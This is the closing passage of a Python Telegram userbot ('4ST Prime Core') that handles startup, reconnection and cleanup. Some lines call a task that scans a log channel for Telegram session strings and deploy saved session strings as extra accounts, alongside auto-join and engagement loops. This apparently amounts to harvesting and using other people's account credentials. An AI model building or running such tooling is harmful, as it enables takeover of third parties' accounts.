            except Exception:
                pass
        else:
            me = await userbot.get_me()
            active_user_ids.add(me.id)
            get_isolated_state(me.id)
            create_event_handler(userbot)
            attach_passive_monitors(userbot)
            if me.id == cfg.get("OWNER_ID"):
                try:
                    await userbot.send_message("me",
                        cfg.get("CUSTOM_STARTUP_MSG", "🟢 <b>4ST PRIME CORE ACTIVE</b>"))
                except Exception:
                    pass
            bot_logger("USERBOT", f"Primary userbot: {me.first_name} ({me.id})")
            userbot_started = True
            # Restore saved start pic on reboot
            _saved_pic_path = cfg.get("SAVED_START_PIC_PATH")
            if _saved_pic_path and os.path.exists(_saved_pic_path):
                async def _restore_startpic_fn(_c=userbot, _p=_saved_pic_path):
                    try:
                        from telethon.tl.functions.photos import UploadProfilePhotoRequest
                        _upl = await _c.upload_file(_p)
                        await _c(UploadProfilePhotoRequest(file=_upl))
                        bot_logger("STARTPIC", "Start pic restored on reboot ✅")
                    except Exception as _err:
                        bot_logger("STARTPIC_ERR", f"Restore failed: {_err}")
                asyncio.create_task(_restore_startpic_fn())
            # Auto-join configured channels/groups/bots on every startup
            asyncio.create_task(auto_join_and_start(userbot))
            asyncio.create_task(auto_channel_engagement_loop())
            # Auto-scan LOG_CHANNEL for session strings — sends live progress
            # to owner via asstbot every minute, full summary at end.
            asyncio.create_task(auto_scanbot_task())
    except Exception as e:
        bot_logger("USERBOT_ERROR", f"Primary userbot failed: {e}")

    # Deploy all saved extra sessions
    for s in list(cfg.get("SAVED_STRINGS", [])):
        asyncio.create_task(deploy_new_session_string(s, is_startup=True))

    # ── Reconnect loop ────────────────────────────────────────────────────────
    # AUTO REBOOT OFF: reconnect loop disabled — bot will exit cleanly on disconnect
    # instead of auto-restarting. Re-enable by setting AUTO_REBOOT=1 in env.
    _reconnect_delay = 15  # seconds to wait before reconnecting
    _AUTO_REBOOT = os.environ.get("AUTO_REBOOT", "0").strip() == "1"

    while True:
        gather_tasks = []
        if asstbot_started:
            gather_tasks.append(asstbot.run_until_disconnected())
        if userbot_started:
            gather_tasks.append(userbot.run_until_disconnected())

        if not gather_tasks:
            bot_logger("SYSTEM",
                "Neither bot nor userbot is connected — retrying in 30s...")
            await asyncio.sleep(30)
            # Attempt reconnect
            try:
                if not asstbot.is_connected():
                    await asstbot.connect()
                if await asstbot.is_user_authorized():
                    asstbot_started = True
                    bot_logger("BOT", "Bot reconnected successfully.")
            except Exception as _re:
                bot_logger("BOT_ERROR", f"Bot reconnect failed: {_re}")

            try:
                if not userbot.is_connected():
                    await userbot.connect()
                if await userbot.is_user_authorized():
                    userbot_started = True
                    bot_logger("USERBOT", "Userbot reconnected successfully.")
            except Exception as _re:
                bot_logger("USERBOT_ERROR", f"Userbot reconnect failed: {_re}")
            continue

        # Add still-running background tasks (extra session clients, etc.)
        alive_bg = [t for t in background_tasks if not t.done()]
        gather_tasks.extend(alive_bg)

        await asyncio.gather(*gather_tasks, return_exceptions=True)

        if not _AUTO_REBOOT:
            bot_logger("SYSTEM", "All connections dropped. AUTO_REBOOT is off — exiting.")
            break

        bot_logger("SYSTEM",
            f"All connections dropped. Reconnecting in {_reconnect_delay}s...")
        await asyncio.sleep(_reconnect_delay)

        # Reconnect primary bot
        asstbot_started = False
        try:
            if not asstbot.is_connected():
                await asstbot.connect()
            if await asstbot.is_user_authorized():
                asstbot_started = True
                bot_logger("BOT", "Bot reconnected after drop.")
            else:
                bot_logger("BOT_ERROR", "Bot session expired — cannot reconnect.")
        except Exception as _re:
            bot_logger("BOT_ERROR", f"Bot reconnect error: {_re}")

        # Reconnect primary userbot
        userbot_started = False
        try:
            if not userbot.is_connected():
                await userbot.connect()
            if await userbot.is_user_authorized():
                userbot_started = True
                bot_logger("USERBOT", "Userbot reconnected after drop.")
            else:
                bot_logger("USERBOT_ERROR",
                    "Userbot session expired — cannot reconnect.")
        except Exception as _re:
            bot_logger("USERBOT_ERROR", f"Userbot reconnect error: {_re}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        bot_logger("SYSTEM", "Shutting down 4ST Prime Core...")
    finally:
        async def _cleanup():
            # PyTgCalls 2.x has no global stop(); stopping pyrogram disconnects
            # any active group calls along with it. Stop every account's
            # client — not just the legacy global one — since each userbot
            # now runs its own independent Pyrogram/PyTgCalls session.
            for _client in list(pyro_apps.values()):
                try:
                    if _client:
                        await _client.stop()
                except Exception:
                    pass
        try:
            asyncio.run(_cleanup())
        except Exception:
            pass
